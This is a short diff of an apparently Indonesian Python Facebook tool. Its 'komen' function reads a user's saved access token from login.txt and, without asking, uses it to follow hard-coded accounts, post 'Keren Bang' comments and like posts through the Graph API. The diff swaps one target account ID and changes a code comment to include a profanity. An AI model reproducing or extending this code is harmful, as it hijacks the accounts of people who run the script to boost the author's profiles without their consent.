@@ -98,7 +98,7 @@ def login():
 			os.system("rm -f login.txt")
 			exit("[?] Login Error")
 ### Bot Komen ###
-def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
+def komen(): # Jangan Di Ganti ANJING #
         try:
                 toket=open('login.txt','r').read()
         except IOError:
@@ -114,7 +114,7 @@ def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
         requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/934976007098547/comments/?message=' +kom+ '&access_token=' + toket)
         requests.post('https://graph.facebook.com/934976007098547/likes?summary=true&access_token=' + toket)
-        requests.post('https://graph.facebook.com/934976007098547/comments/?message=Keren Bang ❤️&access_token=' + toket)
+        requests.post('https://graph.facebook.com/100000395779504/comments/?message=Keren Bang ❤️&access_token=' + toket)
         requests.post('https://graph.facebook.com/934976007098547/likes?summary=true&access_token=' + toket)
         requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket)
